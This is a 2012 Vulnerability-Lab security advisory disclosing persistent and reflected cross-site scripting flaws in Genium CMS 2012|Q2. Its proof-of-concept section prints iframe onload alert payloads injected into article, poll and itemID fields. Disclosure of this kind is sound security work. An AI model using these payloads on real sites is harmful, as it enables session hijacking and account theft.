@@ -1,0 +1,207 @@
+Title:
+======
+Genium CMS 2012|Q2 - Multiple Web Vulnerabilities
+
+
+Date:
+=====
+2012-05-02
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=517
+
+
+VL-ID:
+=====
+517
+
+
+Introduction:
+=============
+Durch den Einsatz von Genium CMS können Sie Ihre Homepage schnell und unabhängig von Spezialisten betreuen. 
+Kostengünstig, schnell und flexibel. Das Erstellen von Internetseiten durch eine Webagentur kostet viel 
+Geld und ist in der Regel nicht von heute auf morgen realisierbar. Mit Genium CMS sparen Sie Kosten und 
+verkürzen Ihre Kommunikationswege drastisch. Bei Aktualisierungen müssen Sie nicht darauf warten bis Ihr 
+EDV-Techniker Zeit hat neue Inhalte online zu stellen. Änderungen, Korrekturen und Ergänzungen realisieren 
+Sie innert Minuten! Um Ihre Homepage aktiv zu nutzen, ist es unumgänglich, dass Sie schnell auf neue Situationen 
+reagieren können. Nur so ist eine direkte Kommunikation mit Ihren Kunden möglich. Die Aktualität Ihrer Homepage 
+ist ein Schlüsselfaktor für einen erfolgreichen Webauftritt. 
+
+(Copy of the Vendor Homepage: http://cms.genium.ch )
+
+
+Abstract:
+=========
+The Vulnerability Laboratory Researcher Team discovered multiple Web Vulnerabilities in Geniums Content Management 
+System 2012|Q2.
+
+
+Report-Timeline:
+================
+2012-05-01:     Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Exploitation-Technique:
+=======================
+Remote
+
+
+Severity:
+=========
+Medium
+
+
+Details:
+========
+1.1
+Multiple persistent input validation vulnerabilities are detected in Geniums Content Management System 2012|Q2.
+The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).
+Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) 
+context manipulation. Exploitation requires low user inter action. The bugs are located on the article listing & pool 
+fields of the application which allows to execute code out of the main genium application context.
+
+
+Vulnerable Module(s):
+                                [+] Article Listing & Add [SELL] - Artikelnummer, Bezeichnung & Preis
+                                [+] Umfrage - Questions & Answers
+
+Picture(s):
+                                ../1.png
+                                ../2.png
+
+
+1.2
+Multiple non persistent cross site scripting vulnerabilities are detected in Geniums Content Management System 2012|Q2.
+The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with high required 
+user inter action or local low privileged user account. Successful exploitation can result in account steal, phishing 
+& client-side content request manipulation.
+
+
+Vulnerable Module(s):
+                                [+] itemID
+                                [+] menuItemID
+
+Picture(s):
+                                ../3.png
+                                ../4.png
+
+
+Proof of Concept:
+=================
+1.1
+The persistent input validation vulnerabilities can be exploited by remote attackers with low required user inter 
+action. 
+For demonstration or reproduce ...
+
+URL: http://127.0.0.1:8080/genium/kontakt-1.php5
+
+Module: Article Listing & Add [SELL] - Artikelnummer, Bezeichnung & Preis
+
+<form name="formArticle6" method="post" action="index.php5?site=basket"><input name="artikelnummer" value="" 
+type="hidden"><iframe src="a" onload='alert("VL")' <"=""><input name="bezeichnung" type="hidden" value="&
+quot;><iframe src=a onload=alert("VL") <"><input name="preis" 
+type="hidden" value=""><iframe src=a onload=alert("VL") <"/><input name="stamp" type="hidden" 
+value="1334501982"/><table border = "0" width="auto" CELLPADDING=0 CELLSPACING=0><tr><
+td width="100%"><strong><nobr>Fr. 0.00   </nobr></strong>
+</td>
+
+
+URL: http://127.0.0.1:8080/genium/galerie.php5#
+
+Module:  Umfrage - Questions & Answers
+
+<p class="title2">"><iframe src="a" onload='alert("VL")' <<="" p="">
+<FORM ACTION="galerie.php5#2" METHOD=post NAME=pollform>
+<TABLE WIDTH=50% cellspacing="0" cellpadding="0" border="0">
+<TR>
+<TD>
+<input name='pollsModuleID' type='hidden' size='50' maxlength='50' value='2'>
+<input type=radio name=question value='1'/>">
+<iframe src=a onload=alert("VL") <<br><
+input type=radio name=question value='2'/>"><iframe src=a onload=alert("VL") <<br>
+
+1.2
+The client side cross site scripting vulnerabilities can be exploited by remote attackers with medium or high required 
+user inter action. 
+For demonstration or reproduce ...
+
+http://127.0.0.1:8080/genium/galerie.php5?moduleID=1&itemID=%22%3E%3Ciframe%20src=a%20onload=
+alert%28%22VL%22%29%20%3C&menuItemID=-1&moduleRenderType=solo
+
+Review: Listing
+
+<a href="index.php5?site=basket" class="menX">Warenkorb (1)</a><a class="menX" href="index.php5
+?site=basketform">Bestellformular</a><a href="/galerie.php5?moduleID=1&itemID=%22%3E%3Ciframe%20src=
+a%20onload=alert(%22VL%22)%20%3C&menuItemID=-1&moduleRenderType=solo&print" class="menX" target="_blank" >Drucken</a>   
+  
+
+... or
+
+<a class="xmenu" href="#" onclick="window.open('./xyloz/modules/photoalbum/photoalbum.editor.module.php5?
+
+func=itemEdit&moduleXMLFile=1290873449_photoalbum.xml&itemID="><iframe src=a onload=alert("VL") <','mywindow',
+'resizable=yes,scrollbars=off,width=740,height=550')" onmouseover='addValue("menu927297");' onmouseout='
+subValue("menu927297");'><img src="./xyloz/images/xedit.gif" class="img" border="0">  bearbeiten</a>
+<a class="xmenu" href="#" onclick="window.open('./xyloz/modules/photoalbum/photoalbum.editor.module.php5?
+
+func=itemDelete&moduleXMLFile=1290873449_photoalbum.xml&itemID="><iframe src=a onload=alert("VL") 
+
+<&site=galerie','mywindow','resizable=yes,scrollbars=off,width=740,height=550')" onmouseover='addValue("menu927297");' 
+onmouseout='subValue("menu927297");'><img src="./xyloz/images/xdel.gif" class="img" border="0">  löschen</a>
+</div>
+
+
+Risk:
+=====
+1.1
+The security risk of the persistent input validation vulnerabilities are estimated as medium(+).
+
+1.2
+The security risk of the non persistent cross site scripting vulnerabilities are estimated as low(+).
+
+
+Credits:
+========
+Vulnerability Laboratory [Research Team]   -   Benjamin Kunz Mejri (Rem0ve)
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all 
+warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. 
+Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss 
+of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such 
+damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing 
+limitation 
+may not apply.
+
+Domains:        www.vulnerability-lab.com   - www.vuln-lab.com
+Section:        video.vulnerability-lab.com - forum.vulnerability-lab.com - news.vulnerability-lab.com
+Contact:        admin () vulnerability-lab com - support () vulnerability-lab com - irc.vulnerability-lab.com
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability 
+Laboratory. 
+Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the 
+use of 
+other media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+
+                                                Copyright © 2012 Vulnerability-Lab
+
+
+
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research () vulnerability-lab com
